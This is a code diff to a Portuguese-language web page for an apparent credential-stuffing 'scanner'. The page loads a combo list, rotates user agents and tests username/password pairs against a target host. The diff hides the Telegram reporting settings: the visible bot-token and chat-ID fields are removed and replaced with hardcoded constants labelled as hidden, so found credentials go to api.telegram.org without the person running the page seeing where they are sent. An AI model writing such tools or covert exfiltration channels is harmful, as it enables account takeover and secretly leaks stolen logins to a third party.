@@ -28,7 +28,6 @@ body {
   font-family: 'Orbitron', monospace;
   color: var(--text-light);
   overflow-x: hidden;
-  /* Configuração do Plano de Fundo com sua imagem */
   background-image: 
     radial-gradient(circle at 50% 50%, rgba(255, 60, 0, 0.1) 0%, transparent 70%),
     linear-gradient(rgba(18, 2, 2, 0.9), rgba(18, 2, 2, 0.9)),
@@ -38,7 +37,6 @@ body {
   background-position: center;
 }
 
-/* BANNER SUPERIOR - INTEGRADO COM A SUA IMAGEM */
 .copa-banner {
   width: 100%;
   background: #120202;
@@ -81,7 +79,6 @@ body {
   stroke-linecap: round;
 }
 
-/* Título LucSons Team com efeito de fogo/neon luminoso nas bordas */
 h1 {
   font-size: 2.8rem;
   font-weight: 900;
@@ -108,7 +105,6 @@ label {
   letter-spacing: 1px;
 }
 
-/* Inputs com bordas de fogo luminoso */
 input[type="text"],
 input[type="number"],
 input[type="file"],
@@ -132,7 +128,6 @@ input:focus, select:focus {
   background: #2b0909;
 }
 
-/* Botões temáticos de fogo */
 button {
   margin-top: 25px;
   margin-right: 15px;
@@ -257,20 +252,6 @@ button:disabled {
   cursor: pointer;
 }
 
-.telegram-config {
-  margin-top: 25px;
-  padding: 20px;
-  background: rgba(36, 6, 6, 0.8);
-  border: 2px dashed var(--neon-fire);
-  border-radius: 16px;
-  max-width: 620px;
-}
-.telegram-config h3 {
-  color: var(--neon-fire);
-  margin-bottom: 15px;
-  font-size: 1.2rem;
-}
-
 footer {
   margin-top: 55px;
   text-align: center;
@@ -307,18 +288,6 @@ footer {
       <label for="concurrencyInput">⚡ VELOCIDADE (THREADS):</label>
       <input type="number" id="concurrencyInput" value="20" min="1" max="100" />
 
-      <div class="telegram-config">
-        <h3>🤖 CONFIGURAÇÃO DO TELEGRAM</h3>
-        <div class="input-group">
-          <label style="margin-top: 0; font-size: 0.9rem;">TOKEN DO BOT:</label>
-          <input type="text" id="tgToken" placeholder="TOKEN_DO_BOT" style="padding: 10px 15px; font-size: 0.9rem;" />
-        </div>
-        <div class="input-group">
-          <label style="margin-top: 10px; font-size: 0.9rem;">CHAT ID:</label>
-          <input type="text" id="tgChatId" placeholder="CHAT_ID" style="padding: 10px 15px; font-size: 0.9rem;" />
-        </div>
-      </div>
-
       <div style="margin-top: 10px;">
         <button id="startBtn" disabled>▶️ INICIAR SCANNER</button>
         <button id="stopBtn" disabled>⏸️ INTERROMPER</button>
@@ -347,6 +316,14 @@ footer {
 </div>
 
 <script>
+// ==========================================
+// CONFIGURAÇÕES OCULTAS DO TELEGRAM
+// INSIRA SEUS DADOS ENTRE AS ASPAS ABAIXO:
+// ==========================================
+const CONFIG_TELEGRAM_TOKEN = "COLOQUE_SEU_TOKEN_AQUI";
+const CONFIG_TELEGRAM_CHAT_ID = "COLOQUE_SEU_CHAT_ID_AQUI";
+// ==========================================
+
 const hostInput = document.getElementById('hostInput');
 const comboFile = document.getElementById('comboFile');
 const concurrencyInput = document.getElementById('concurrencyInput');
@@ -357,8 +334,6 @@ const progressBarFill = document.getElementById('progressBarFill');
 const progressText = document.getElementById('progressText');
 const hitsCountDisplay = document.getElementById('hitsCount');
 const hitsContainer = document.getElementById('hitsContainer');
-const tgTokenInput = document.getElementById('tgToken');
-const tgChatIdInput = document.getElementById('tgChatId');
 
 const userAgents = [
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
@@ -438,9 +413,9 @@ async function fetchStreamData(host, user, pass) {
 }
 
 async function enviarTelegram(texto) {
-  const token = tgTokenInput.value.trim();
-  const chatId = tgChatIdInput.value.trim();
-  if (!token || !chatId) return;
+  const token = CONFIG_TELEGRAM_TOKEN.trim();
+  const chatId = CONFIG_TELEGRAM_CHAT_ID.trim();
+  if (!token || token.startsWith("COLOQUE_") || !chatId || chatId.startsWith("COLOQUE_")) return;
   try {
     await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
